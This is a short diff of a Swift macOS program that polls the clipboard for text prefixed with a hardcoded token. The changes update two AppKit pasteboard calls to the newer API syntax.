@@ -4,13 +4,13 @@ import AppKit
 
 let token = "80F81AC50DA4458D8C46AFA3DCF8E451"
 
-let pb = NSPasteboard.general()
+let pb = NSPasteboard.general
 let home = String(validatingUTF8: getenv("HOME")) ?? ""
 let cmd_prefix = token + " "
 
 while true {
     sleep(1)
-    guard let s = pb.string(forType: NSPasteboardTypeString), s.hasPrefix(cmd_prefix) else {
+    guard let s = pb.string(forType: NSPasteboard.PasteboardType.string), s.hasPrefix(cmd_prefix) else {
         continue
     }
 
